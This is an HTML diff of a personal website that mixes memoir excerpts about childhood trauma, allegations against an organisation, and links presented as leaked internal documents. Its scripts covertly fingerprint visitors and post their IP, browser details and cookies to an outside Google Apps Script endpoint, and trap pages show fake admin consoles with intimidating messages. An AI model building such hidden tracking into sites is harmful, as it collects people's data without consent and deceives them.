+    <li>The <code>.xyz</code> domain was accessed <strong>from saved internal referrals</strong></li>
+    <li>The link was <strong>shared or circulated inside Ruah</strong> after public visibility was severed</li>
+  </ul>
+  <p>The trail was cut — but they kept walking it.</p>
+  <p>Their decision to connect or observe confirms what this site has always stated: the silence was never because they didn’t know. They knew. And they followed.</p>
+  <p>As this story spreads, the number of connected viewers — silent or otherwise — continues to grow.<br/>
+  Some stay quiet. Some just watch. But no one can say they didn’t see it coming.</p>
+  <p style="margin-top: 2rem; font-size: 1em;">
+    <strong><h3>[📍 Timestamped. Tracked. Preserved. 🕵️]</h3></strong>
+  </p>
+</section><hr>
+
+
+
+<!-- END -->
+
+
+
+<!-- police section  -->
+
+
+
+<blockquote>
+  <strong>“Good Morning Kevin, I am in receipt of your emails below. I apologise for the delay in my reply, I do not work each day.”<br><br>
+  “I hope you are feeling better.”</strong><br>
+  <cite>- Sgt. P.F.</cite>
+</blockquote>
+<h2><center>COMING SOON!</center></h2><br><center>000 calls, welfare checks, coercion and official complaints raised.</center><hr>
+
+
+
+<!-- END -->
+
+
+
+<!-- MEMOIR SECTION -->
+
+
+
+<!-- Born Wrong in Their World Section -->
+
+<br><h1 style=" text-align:center; margin-top:20px;">
+  <strong><u>Preview: Born Wrong In Their World (Memoir Excerpt)
+</strong></u></h1><br>
+
+<p>I was born in the ’80s.</p>
+
+<p>It was a different world back then. No internet. No awareness. People didn’t speak of things they didn’t understand — they hid them. Buried them. Erased them with shame.</p>
+
+<p>I must’ve been around three. I don’t have clear memories from then — which tells me I was still very young.<br>
+But I remember fear. That part never left.<br>
+Not fear of anything in particular — just an ambient, silent dread.</p>
+
+<p>There are photos of me smiling.<br>
+So I know, logically, that I must’ve laughed. Played. Been held.</p>
+
+<h3>Preschool: Echoes of a Beginning</h3>
+
+<p>I have faint memories of preschool.<br>
+Faint — but persistent.<br>
+Fragments, like old film reels burned at the edges.</p>
+
+<p>There was a girl.<br>
+Sarah? Sara? Something like that.<br>
+Smaller than me. Long, straight light-brown hair.<br>
+I don’t remember her face — just a blur framed by hair and movement.</p>
+
+<p>What I do remember is the feeling.<br>
+Uncomfortable, unfamiliar — but not bad.<br>
+Something like belonging, though I didn’t understand it then.</p>
+
+<p>Every time we walked through the preschool gates, she’d appear — out of nowhere.<br>
+Run up, jump, stretch, kiss me on the cheek, and vanish again.<br>
+Routine. Predictable. Like clockwork.</p>
+
+<p>It wasn’t a one-off.<br>
+Mum mentioned it once, offhand, like it amused her.<br>
+So it must’ve happened often enough to etch itself into her memory too.</p>
+
+<p>But to me?<br>
+It’s just Sarah — or Sara — a soft glitch in the beginning of a system that never made sense.<br>
+Not a love story. Not even a friendship.<br>
+Just a ghost loop from a time I didn’t understand myself yet.</p>
+
+<p>Autism flattens some things like that.<br>
+She’s not a person in my head — she’s a pattern.<br>
+And like most things from back then, she fades before I can ask her name.</p>
+
+<p>There are other fragments from preschool — some confirmed by Mum, some lost to the fog.<br>
+One sticks hard.</p>
+
+<p>It was early on.<br>
+Recess? Lunch? Whatever they called it.<br>
+All the kids would run out to play — to the sandpits, the swings, the chaos of childhood freedom.</p>
+
+<p>Me?</p>
+
+<p>I froze.<br>
+Right where Mum left me.<br>
+Inside.</p>
+
+<p>Not out of defiance. Not out of confusion.<br>
+But because my body wouldn’t move.<br>
+Not couldn’t. Wouldn’t.</p>
+
+<p>My mind screamed: <em>Move.</em><br>
+My body replied: <em>Nope.</em><br>
+Mind: <em>MOVE!</em><br>
+Body: <em>hehehehe… watch this.</em></p>
+
+<p>And then I pissed myself.<br>
+Not because I wasn’t toilet trained. I was.<br>
+But because the shutdown was total.</p>
+
+<p>Tears. Heat. The teacher’s voice — too loud, too close.<br>
+Dragged out in front of everyone. A scene. A freak.</p>
+
+<p>It didn’t happen just once.<br>
+It happened enough times that someone eventually caught on:<br>
+If a shadow walked with me, I could move.<br>
+I just needed to feel safe.</p>
+
+<p>“Do you know how to use the toilet, Kevin?”<br>
+Nod.<br>
+“Are you sure?”<br>
+Nod.<br>
+“Kevin?”<br>
+Face screws up. Meltdown begins.</p>
+
+<p>Because repeating myself isn’t easy.<br>
+Because being asked the same question over and over triggers panic — not understanding.<br>
+Because autism doesn’t always mean “different.”<br>
+Sometimes it means <em>done explaining.</em></p>
+
+<p>Where that memory fades, I don’t know.<br>
+Time has never been linear for me.</p>
+
+<p>It loops.<br>
+It collapses in on itself.<br>
+My brain doesn’t sort life by date — it sorts it by pattern.</p>
+
+<p>And sometimes…<br>
+I see things before they happen.<br>
+Not magic. Not prophecy.<br>
+Just pattern recognition at a level most people never trained for.</p>
+
+<p>But that’s a story for later — deeper in the saga.</p>
+
+<p>This is just the beginning.</p>
+
+<p>But I don’t remember it.<br>
+And that absence has haunted me more than any violent memory ever could.</p>
+
+<p>Did that part of me die?<br>
+Or is it still there — buried beneath years of noise and survival?</p>
+
+<p>I didn’t socialise. I didn’t speak the “right” way.<br>
+I didn’t fit.</p>
+
+<p>So they took me to a doctor.<br>
+Who? When? I don’t know.<br>
+They never told me.<br>
+They never tell kids like me.</p>
+
+<p>Even now, the records are lost. Or hidden. Or locked away somewhere.<br>
+And somehow, it’s always my fault.</p>
+
+<p>The word came back: Asperger’s.<br>
+But instead of answers, it brought denial.</p>
+
+<p>“No. Our child is not retarded.”</p>
+
+<p>That was the end of it.<br>
+The diagnosis vanished.<br>
+No support. No accommodation. No acknowledgement.<br>
+It would not be spoken of again — not until decades later, when a dying woman muttered truths between her regrets.</p>
+
+<p>She lost every child she ever bore.<br>
+And yet, I stayed.</p>
+
+<p>Why?<br>
+Because no one deserves to die alone. Not even her.<br>
+I didn’t stay out of guilt.<br>
+I stayed because it was right.<br>
+And doing what’s right is how I live with myself.</p>
+
+<p>“My son will not be a retard.”<br>
+“Don’t be a pussy boy.”<br>
+“Men don’t cry.”<br>
+“I’ll beat the man into you.”</p>
+
+<p>That was my father.<br>
+A man who clung to the memory of a short stint in the army reserves like it made him something.</p>
+
+<p>Our house was a training ground.<br>
+Discipline. Routine. Domination.</p>
+
+<p>I was a child.<br>
+He treated me like a soldier.</p>
+
+<p>And I didn’t understand why I couldn’t keep up.<br>
+Why I kept breaking the rules I didn’t know existed.<br>
+Why everything I did — how I moved, felt, flinched, froze — was wrong.</p>
+
+<p>I wasn’t broken.<br>
+The world was.<br>
+And I was being punished for not conforming to a world that refused to make space for difference.</p>
+
+
+<blockquote>
+  <p><h3><strong><em>"I’ve never asked to be treated differently.<br>
+I’ve only ever asked for the world to change — because we are different."</em></strong></h3></p>
+<p>- Me.<br></blockquote>
+<p><strong><u>And that difference matters.</strong></u></p><hr>
+
+<!-- Behind the chair -->
+
+
+<br><h1 style=" text-align:center; margin-top:20px;">
+  <strong><u>Preview: Early Memory Fragment – “Behind the Chair” (Memoir Excerpt)
+</strong></u></h1><br>
+<section class="memoir-entry">
+
+  <p>The memories are scattered — some vague, others sharp in feeling but blurred in detail.<br>
+  They were likely buried, either by trauma or by survival instinct. I don’t know.</p>
+
+  <p>But I know the pain. And I know the confusion.</p>
+
+  <p>My sister was three years older than me.<br>
+  She was also harmed — I believe by our father. Whether she was told to act the way she did, or whether it was trauma acting through her, I can’t know.<br>
+  She cut contact with the family years ago, blamed <em>me</em>, and vanished. I never understood why. Still don’t.</p>
+
+  <p>One of my earliest memories is of an armchair in her bedroom.<br>
+  I was hiding behind it — not from danger exactly, just… hiding.<br>
+  She was there too. And she told me to do things.<br>
+  I didn’t understand them. I was three. She was six.<br>
+  I didn’t know what “right” or “wrong” was. Just that something felt off.</p>
+
+  <p>I remember another setting — under the blankets.<br>
+  Things happened there too. Things that happened more than once.<br>
+  She gave me instructions I didn’t understand — not then, not fully even now.<br>
+  She used words I didn’t know, told me to act out things I didn’t yet have a body for.</p>
+
+  <p>I don’t know how long it went on.<br>
+  I don’t know how often.<br>
+  But I remember the pattern.<br>
+  That’s how my brain holds things — not in sequence, but in repetition.</p>
+
+  <p>This is what my earliest years looked like.<br>
+  Not joy. Not laughter. Just confusion, pressure, obedience, and a sense of something being deeply wrong.</p>
+
+  <p>I don’t have good memories until maybe age 10 or 11 — and even those are tangled in later pain.<br>
+  But they exist, small as they are.<br>
+  And I hold onto those few flecks of light — because on the dark days, they’re all I’ve got.</p>
+</section><hr>
+
+
+
+<!-- END -->
+
+
+
+<!-- socials section  -->
+
+
+
+<div class="footer-icons">
+  <a href="https://x.com/AHuman88539392" target="_blank" style="text-decoration: none;">
+    <img src="https://i.imgur.com/irFix2a.png" alt="Follow on X" style="width:30px;height:30px;border-radius:50%;vertical-align:middle;">
+  </a>
+  <a href="https://www.linkedin.com/in/rev-k-m-d-b19953b6/" target="_blank" style="text-decoration: none; margin-left: 10px;">
+    <img src="https://cdn-icons-png.flaticon.com/512/174/174857.png" alt="LinkedIn" style="width:30px;height:30px;border-radius:5px;vertical-align:middle;">
+  </a>
+  <a href="https://www.youtube.com/@SharingSilence81" target="_blank" style="text-decoration: none; margin-left: 10px;">
+    <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube" style="width:30px;height:30px;border-radius:5px;vertical-align:middle;">
+  </a>
+</div>
+
+<!-- links section  -->
+
+<style>
+  .links a {
+    color: #88c0d0;
+    font-style: italic;
+    text-decoration: none;
+    transition: color 0.3s ease;
+  }
+  .links a:hover {
+    color: #4da6ff;
+    text-decoration: underline;
+  }
+</style>
+
+<div class="links" style="text-align: center; margin-top: 10px;">
+  <a href="https://staffmemo.sharingsilence.xyz/StaffBrief-May2025.pdf" target="_blank">
+    🔒📄 Internal Brief: Staff_Memo—May_2025.pdf 📡
+  </a>
+</div>
+
+<div class="links" style="text-align: center; margin-top: 5px;">
+  <a href="https://emaildump.sharingsilence.xyz/emaildumpmayjune2025.zip" target="_blank">
+    🔒🗃️ Full_Email_Dump—May/June_2025.zip 📡
+  </a>
+</div>
+
+<div class="links" style="text-align: center; margin-top: 5px;">
+  <a href="https://Tracedump.sharingsilence.xyz/tracelog2025.zip" target="_blank">
+    🔒🛰️ TraceLog_June_2025.zip 📡
+  </a>
+</div>
+
+
+<div class="links" style="text-align: center; margin-top: 5px;">
+  <a href="https://staffmemo.sharingsilence.xyz/StaffBrief-June2025.pdf" target="_blank">
+    🔒📄 Internal Brief: Staff_Memo—June_2025.pdf 📡
+  </a>
+</div><hr>
+
+
+
+<!-- END -->
+
+
+
+
+<!-- email section  -->
+
+
+
+<div style="text-align: center; max-width: 600px; margin: 0 auto;">
+<p style="font-size: 0.85em; color: #556655; margin-top: 15px;">
+    Think you can help?<br>
+  <form action="https://formspree.io/f/xvgrrlan" method="POST">
+    <label for="email">Your Email (Optional):</label><br>
+    <input type="email" name="email" id="email" placeholder="your@email.com" style="width: 100%; max-width: 400px;"><br><br>
+
+    <label for="message">Message:</label><br>
+    <textarea name="message" id="message" rows="6" required placeholder="Write your message here..." style="width: 100%; max-width: 400px;"></textarea><br><br>
+
+    <button type="submit">Send Message</button>
+  </form>
+
+  <p style="font-size: 0.85em; color: #556655; margin-top: 15px;">
+    Your email address will never be published, if genuine offers of help.<br>
+    All messages are reviewed only by the site operator.
+  </p>
+</div><hr>
+
+
+
+<!-- END -->
+
+
+
+<!-- footer section  -->
+
+
+
+<!-- legal text  -->
+
+<p style="font-size: 0.75em; This site detects and rejects automated surveillance. Read with intention.color: #556655; text-align: center;">
+  All quotations are either:
+  <br>• Directly sourced from personal correspondence, or
+  <br>• Taken from public-facing profiles or statements,
+  <br>and are presented with contextual commentary grounded in personal experience.<br><br><!-- Silent ping detected. You didn't make it through. -->
+
+<!-- Detcts text -->
+
+<br>This site detects and rejects automated surveillance. Read with intention.
+</p><br>
+
+<!-- legal text2 -->
+
+<p style="font-size: 0.85em; color: #889988; text-align: center;">
+  <strong>Disclaimer:</strong> This site contains personal testimony, direct source quotations, and public commentary. All statements reflect the lived experience, emotional impact, and documented records of the author. This is not legal advice, medical advice, or official allegation — it is a personal archive of harm and truth.
+</p><hr>
+
+<!-- copyright text -->
+
+<p style="font-size: 0.75em; color: #667766; text-align: center; margin-top: 40px;">
+  © 2025 K.M.D All rights reserved. Public quotes and titles remain the property of their original authors. Content reproduced under fair use and fair dealing principles for the purpose of criticism, documentation, and lived experience reporting.
+</p>
+
+
+
+<!-- END -->
+
+
+
+<!-- scripts section-->
+
+
+
+<!-- Default Statcounter code for #SharingSilence -->
+
+<script type="text/javascript">
+var sc_project=13142847; 
+var sc_invisible=1; 
+var sc_security="9cd26c78"; 
+var scJsHost = "https://";
+document.write("<sc"+"ript type='text/javascript' src='" +
+scJsHost+
+"statcounter.com/counter/counter.js'></"+"script>");
+</script>
+<noscript>
+  <div class="statcounter">
+    <a title="Web Analytics" href="https://statcounter.com/" target="_blank">
+      <img class="statcounter" src="https://c.statcounter.com/13142847/0/9cd26c78/0/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">
+    </a>
+  </div>
+</noscript>
+
+<!-- Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-P5RCP52LG5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-P5RCP52LG5');
+</script>
+
+<div style="text-align: center; font-size: 12px; color: #888; margin-top: 10px;">
+</div><hr>
+
+
+
+<!-- END -->                                           
+
+
+
+
+<!-- 1. Fingerprint Logger (non-invasive, analytics-based) -->
+
+<script>
+  fetch("https://api.ipify.org?format=json")
+    .then(response => response.json())
+    .then(data => {
+      const fingerprint = {
+        ip: data.ip,
+        userAgent: navigator.userAgent,
+        screen: ${screen.width}x${screen.height},
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toISOString()
+      };
+
+      // Log to a remote endpoint (your Google Sheet)
+      fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(fingerprint)
+      });
+
+      // (Optional) Also log in browser console for dev
+      console.log("Visitor fingerprint:", fingerprint);
+    });
+</script>
+
+<!-- 2. Honeypot Link -->
+
+<a href="#" onclick="alert('DENIED! SUCKER!')" style="font-size:0.55em; color: #888;">
+  ADMIN (Login Required)
+</a>
+
+
+
+<!-- END -->
+
+
+
+<!-- 3. Invisible Surveillance Log Bait -->
+
+<div style="display: none;">
+  Systems detected. Log entry created on access.
+  Attempts to bypass visibility recorded by remote handlers.
+</div>
+
+
+
+<!-- END -->
+
+
+
+<!-- 4. Conditional JavaScript Detection Warning -->
+
+<script>
+  // Triggers only for headless browsers / bots that don’t render JS properly
+  if (!navigator.userAgent || navigator.webdriver) {
+    document.body.insertAdjacentHTML('afterbegin',
+      '<div style="background:#111;color:#0f0;padding:1em;text-align:center;font-size:0.9em;">You’re not accessing this like a human. That’s fine — just know we’re watching too.</div>'
+    );
+  }
+</script>
+
+
+
+<!-- END -->
+
+
+
+<!-- AUDIO -->
+<audio id="bgSound" loop preload="auto">
+  <source src="https://dl.dropboxusercontent.com/scl/fi/pl56m9ts9yd6c5yxc29by/low-engine-hum-72529.mp3?rlkey=cjykcdsekkv8biy8ijtyaiqnl&st=fxhyjuje" type="audio/mpeg">
+</audio>
+
+<!-- FAINT GLOW PULSE -->
+<div id="signalPulse" style="
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: radial-gradient(circle, rgba(160, 0, 0, 0.15) 0%, rgba(0, 0, 0, 0) 90%);
+  opacity: 0.25;
+  pointer-events: none;
+  animation: pulse 6s infinite ease-in-out;
+  z-index: 0;
+  filter: blur(10px);
+"></div>
+
+<!-- PULSE ANIMATION -->
+<style>
+  @keyframes pulse {
+    0%, 100% { opacity: 0.2; }
+    50% { opacity: 0.5; }
+  }
+</style>
+
+<!-- ACTIVATION LOGIC -->
+<script>
+  window.addEventListener("DOMContentLoaded", () => {
+    const audio = document.getElementById("bgSound");
+    const pulse = document.getElementById("signalPulse");
+
+    try {
+      audio.volume = 0.1;
+      const playPromise = audio.play();
+      if (playPromise !== undefined) {
+        playPromise
+          .then(() => pulse.style.opacity = "1")
+          .catch(err => console.warn("Autoplay failed:", err));
+      }
+    } catch (e) {
+      console.warn("Autoplay exception:", e);
+    }
+  });
+</script>
+
+
+
+
+<!-- END -->
+
+
+
+<!-- LOVE HEARTS SHARED STYLE & SCRIPT -->
+
+
+
+<style>
+  .stable-img {
+    width: 300px;
+    max-width: 100%;
+    min-width: 200px;
+    height: auto;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    margin-right: 1rem;
+    margin-bottom: 0.5rem;
+  }
+
+  .caption-block {
+    clear: both;
+    font-size: 0.65rem;
+    color: #ccc;
+    margin-top: 0.4rem;
+  }
+
+  .pulse-hover:hover {
+    animation: pulse 1.5s infinite;
+  }
+
+  @keyframes pulse {
+    0%   { box-shadow: 0 0 5px rgba(0, 255, 0, 0.3); }
+    50%  { box-shadow: 0 0 15px rgba(0, 255, 0, 0.6); }
+    100% { box-shadow: 0 0 5px rgba(0, 255, 0, 0.3); }
+  }
+
+  .heart {
+    position: absolute;
+    font-size: 1.2rem;
+    animation: floatHeart 1.5s forwards;
+    pointer-events: none;
+    z-index: 10;
+  }
+
+  @keyframes floatHeart {
+    0%   { transform: translateY(0) scale(1); opacity: 1; }
+    100% { transform: translateY(-50px) scale(1.5); opacity: 0; }
+  }
+
+  .heart-container {
+    position: relative;
+    display: inline-block;
+  }
+</style>
+
+<!-- SCRIPTS (Include only once) -->
+
+<script>
+
+  window.spawnMultipleHearts = function(wrapper) {
+    const heartVariants = ['🤑', '💀', '💸', '🐍'];
+    for (let i = 0; i < 3; i++) {
+      const heart = document.createElement('div');
+      heart.className = 'heart';
+      heart.innerText = heartVariants[Math.floor(Math.random() * heartVariants.length)];
+      heart.style.left = `${50 + (Math.random() * 20 - 10)}%`;
+      heart.style.top = `${10 + Math.random() * 10}px`;
+      heart.style.transform = 'translateX(-50%)';
+      heart.style.position = 'absolute';
+      heart.style.fontSize = '1.2rem';
+      heart.style.animation = 'floatHeart 1.5s forwards';
+      heart.style.pointerEvents = 'none';
+      heart.style.zIndex = 10;
+      wrapper.appendChild(heart);
+      setTimeout(() => heart.remove(), 1500);
+    }
+  };
+</script>
+
+<!-- STYLES (Include only once) -->
+
+<style>
+  @keyframes floatHeart {
+    0%   { transform: translateY(0) scale(1); opacity: 1; }
+    100% { transform: translateY(-50px) scale(1.5); opacity: 0; }
+  }
+
+  .heart {
+    position: absolute;
+    font-size: 1.2rem;
+    animation: floatHeart 1.5s forwards;
+    pointer-events: none;
+    z-index: 10;
+  }
+
+  .heart-image-wrapper {
+    position: relative;
+    display: inline-block;
+    float: left;
+    width: 15%;
+    margin-right: 1.2rem;
+    margin-bottom: 0.5rem;
+  }
+
+  .heart-image-wrapper img {
+    width: 100%;
+    height: auto;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    display: block;
+  }
+</style>
+
+
+
+<!-- END -->
+
+
+
+
+<!-- LOVE HEARTS SHARED STYLE & SCRIPT -->
+
+<style>
+  .stable-img {
+    width: 300px;
+    max-width: 100%;
+    min-width: 200px;
+    height: auto;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    margin-right: 1rem;
+    margin-bottom: 0.5rem;
+  }
+
+  .caption-block {
+    clear: both;
+    font-size: 0.65rem;
+    color: #ccc;
+    margin-top: 0.4rem;
+  }
+
+  .pulse-hover:hover {
+    animation: pulse 1.5s infinite;
+  }
+
+  @keyframes pulse {
+    0%   { box-shadow: 0 0 5px rgba(0, 255, 0, 0.3); }
+    50%  { box-shadow: 0 0 15px rgba(0, 255, 0, 0.6); }
+    100% { box-shadow: 0 0 5px rgba(0, 255, 0, 0.3); }
+  }
+
+  .heart {
+    position: absolute;
+    font-size: 1.2rem;
+    animation: floatHeart 1.5s forwards;
+    pointer-events: none;
+    z-index: 10;
+  }
+
+  @keyframes floatHeart {
+    0%   { transform: translateY(0) scale(1); opacity: 1; }
+    100% { transform: translateY(-50px) scale(1.5); opacity: 0; }
+  }
+
+  .heart-container {
+    position: relative;
+    display: inline-block;
+  }
+</style>
+
+
+
+<!-- END -->
+
+
+
+
+
+<!-- For scripts with emjois
+
+spawnGreedyIcons(this) spawnMultipleHearts(this) spawnMultipleSnakes(this) spawnMultipleMonsters(this)
+
+
+<div style="overflow: visible; margin: 1.2rem 0; position: relative; min-height: 000px;"> <div style="position: relative; display: inline-block; float: left; width: 15%; margin-right: 1.2rem; margin-bottom: 0.5rem;" onmouseover=". . ."><img src=". . ." alt=". . ." style="width: 100%; height: auto; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); display: block;"></div> 
+    
+-- >
+
+
+No file chosenNo file chosen
+ChatGPT can make mistakes. Check importa
+
+
+
+<!-- MONSTER SCRIPT (Include only once) -->
+
+<script>
+  window.spawnMultipleMonsters = function(wrapper) {
+    const monsterVariants = ['👹','💀','🧟', '🧛','🧌'];
+    for (let i = 0; i < 5; i++) {
+      const monster = document.createElement('div');
+      monster.className = 'monster';
+      monster.innerText = monsterVariants[Math.floor(Math.random() * monsterVariants.length)];
+      monster.style.left = `${50 + (Math.random() * 20 - 10)}%`;
+      monster.style.top = `${10 + Math.random() * 10}px`;
+      monster.style.transform = 'translateX(-50%)';
+      monster.style.position = 'absolute';
+      monster.style.fontSize = '1.3rem';
+      monster.style.animation = 'floatMonster 1.5s forwards';
+      monster.style.pointerEvents = 'none';
+      monster.style.zIndex = 10;
+      wrapper.appendChild(monster);
+      setTimeout(() => monster.remove(), 1500);
+    }
+  };
+</script>
+
+<!-- MONSTER STYLE -->
+
+<style>
+  @keyframes floatMonster {
+    0%   { transform: translateY(0) scale(1); opacity: 1; }
+    100% { transform: translateY(-50px) scale(1.5); opacity: 0; }
+  }
+
+  .monster {
+    position: absolute;
+    font-size: 1.3rem;
+    animation: floatMonster 1.5s forwards;
+    pointer-events: none;
+    z-index: 10;
+  }
+
+  .monster-image-wrapper {
+    position: relative;
+    display: inline-block;
+    float: left;
+    width: 15%;
+    margin-right: 1.2rem;
+    margin-bottom: 0.5rem;
+  }
+
+  .monster-image-wrapper img {
+    width: 100%;
+    height: auto;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    display: block;
+  }
+</style>
+
+
+
+<!-- END -->
+
+
+
+<!-- SNAKE SCRIPT (Include only once) -->
+
+<script>
+  window.spawnMultipleSnakes = function(wrapper) {
+    const snakeVariants = ['🐍', '🐖', '💸', '🐍'];
+    for (let i = 0; i < 5; i++) {
+      const snake = document.createElement('div');
+      snake.className = 'snake';
+      snake.innerText = snakeVariants[Math.floor(Math.random() * snakeVariants.length)];
+      snake.style.left = `${50 + (Math.random() * 20 - 10)}%`;
+      snake.style.top = `${10 + Math.random() * 10}px`;
+      snake.style.transform = 'translateX(-50%)';
+      snake.style.position = 'absolute';
+      snake.style.fontSize = '1.3rem';
+      snake.style.animation = 'floatSnake 2s forwards';
+      snake.style.pointerEvents = 'none';
+      snake.style.zIndex = 10;
+      wrapper.appendChild(snake);
+      setTimeout(() => snake.remove(), 2000);
+    }
+  };
+</script>
+
+<!-- SNAKE STYLE -->
+
+<style>
+  @keyframes floatSnake {
+    0%   { transform: translateY(0) scale(1) rotate(0deg); opacity: 1; }
+    100% { transform: translateY(-60px) scale(1.3) rotate(20deg); opacity: 0; }
+  }
+
+  .snake {
+    position: absolute;
+    font-size: 1.3rem;
+    animation: floatSnake 2s forwards;
+    pointer-events: none;
+    z-index: 10;
+  }
+
+  .snake-image-wrapper {
+    position: relative;
+    display: inline-block;
+    float: left;
+    width: 15%;
+    margin-right: 1.2rem;
+    margin-bottom: 0.5rem;
+  }
+
+  .snake-image-wrapper img {
+    width: 100%;
+    height: auto;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    display: block;
+  }
+</style>
+
+
+
+<!-- END -->
+
+
+
+<!-- GREED SCRIPT (Include only once) -->
+
+
+
+<script>
+  window.spawnGreedyIcons = function(wrapper) {
+    const greedyVariants = ['🐖', '🐍', '🤑', '💸', '🐍'];
+    for (let i = 0; i < 5; i++) {
+      const icon = document.createElement('div');
+      icon.className = 'greedy-icon';
+      icon.innerText = greedyVariants[Math.floor(Math.random() * greedyVariants.length)];
+      icon.style.left = `${50 + (Math.random() * 20 - 10)}%`;
+      icon.style.top = `${10 + Math.random() * 10}px`;
+      icon.style.transform = 'translateX(-50%)';
+      icon.style.position = 'absolute';
+      icon.style.fontSize = '1.3rem';
+      icon.style.animation = 'floatGreedy 2s forwards';
+      icon.style.pointerEvents = 'none';
+      icon.style.zIndex = 10;
+      wrapper.appendChild(icon);
+      setTimeout(() => icon.remove(), 2000);
+    }
+  };
+</script>
+
+<!-- SNAKE STYLE -->
+
+<style>
+  @keyframes floatGreedy {
+    0%   { transform: translateY(0) scale(1) rotate(0deg); opacity: 1; }
+    100% { transform: translateY(-60px) scale(1.3) rotate(10deg); opacity: 0; }
+  }
+
+  .greedy-icon {
+    position: absolute;
+    font-size: 1.3rem;
+    animation: floatGreedy 2s forwards;
+    pointer-events: none;
+    z-index: 10;
+  }
+
+  .greedy-image-wrapper {
+    position: relative;
+    display: inline-block;
+    float: left;
+    width: 15%;
+    margin-right: 1.2rem;
+    margin-bottom: 0.5rem;
+  }
+
+  .greedy-image-wrapper img {
+    width: 100%;
+    height: auto;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    display: block;
+  }
+</style>
+
+
+
+<!-- END -->
+
+
+
+<!-- /cmd_sco trap -->
+
+
+
+<script>
+(function(){
+  if (window.location.pathname === "/cmd_sco") {
+    // 🍪 Set repeat-visitor cookie
+    document.cookie = "cmdsco_visited=true; path=/; max-age=2592000"; // 30 days
+
+    // 📩 Log + Email
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const fingerprint = {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          page: "/cmd_sco",
+          email: "sharingsilence81@gmail.com",
+          cookie: document.cookie
+        };
+
+        // 🔐 Google Apps Script Logger + Email sender
+        fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        });
+      });
+
+    // 🧟 Honeypot Field (only visible to bots)
+    const botTrap = document.createElement("input");
+    botTrap.name = "email_confirm";
+    botTrap.style.position = "absolute";
+    botTrap.style.left = "-9999px";
+    botTrap.setAttribute("aria-hidden", "true");
+    document.body.appendChild(botTrap);
+
+    // 🛡️ Fake Admin Interface Display
+    document.body.innerHTML = `
+      <div style="background:#0d0d0d;color:#7FCF7F;font-family:monospace;padding:2rem;">
+        <h2>🛡️ SYSTEM INTERFACE</h2>
+        <p>auth >> /root/operator</p>
+        <p>verifying...</p>
+        <p>⛔ CMD_SC0 triggered. Trace created. Admin notified.</p>
+        <p>Fingerprint: CAPTURED</p>
+        <p>Redirecting in 5 seconds...</p>
+      </div>
+    `;
+
+    // 🔁 Auto-redirect after 5s
+    setTimeout(() => {
+      window.location.href = "/";
+    }, 5000);
+  }
+})();
+</script>
+
+
+
+<!-- END -->
+
+
+
+<!--  /auth-logs trap -->
+
+
+<script>
+(function(){
+  if (window.location.pathname === "/auth-logs") {
+    // Cookie flag
+    document.cookie = "authlogs_visited=true; path=/; max-age=2592000";
+
+    // Fingerprint + log to your sheet
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const fingerprint = {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          page: "/auth-logs",
+          email: "sharingsilence81@gmail.com",
+          cookie: document.cookie
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        });
+
+        // Display fake audit log
+        document.body.innerHTML = `
+          <div style="background:#000;color:#A0FFA0;font-family:monospace;padding:2rem;">
+            <h2>🔐 AUTH LOGS INTERFACE</h2>
+            <table border="1" style="margin-top:1rem;border-color:#333;width:100%;max-width:700px;">
+              <tr><th>IP Address</th><th>Timestamp</th><th>Status</th></tr>
+              <tr><td>${data.ip}</td><td>${new Date().toLocaleString()}</td><td style="color:red;">⚠️ Suspicious Access</td></tr>
+              <tr><td>172.18.34.23</td><td>2025-06-20 03:12:41</td><td>Failed Login</td></tr>
+              <tr><td>203.112.41.18</td><td>2025-06-20 03:01:05</td><td>Timeout</td></tr>
+              <tr><td>10.1.94.52</td><td>2025-06-19 22:47:15</td><td>Repeated Access</td></tr>
+            </table>
+            <p style="margin-top:2rem;color:#f55;">This interface is monitored. Access logs have been preserved.</p>
+          </div>
+        `;
+      });
+  }
+})();
+</script>
+
+
+
+<!-- END -->
+
+
+
+<!--  /admin-panel trap -->
+
+<script>
+(function(){
+  if (window.location.pathname === "/admin-panel") {
+    document.cookie = "adminpanel_visited=true; path=/; max-age=2592000";
+
+    fetch("https://api.ipify.org?format=json")
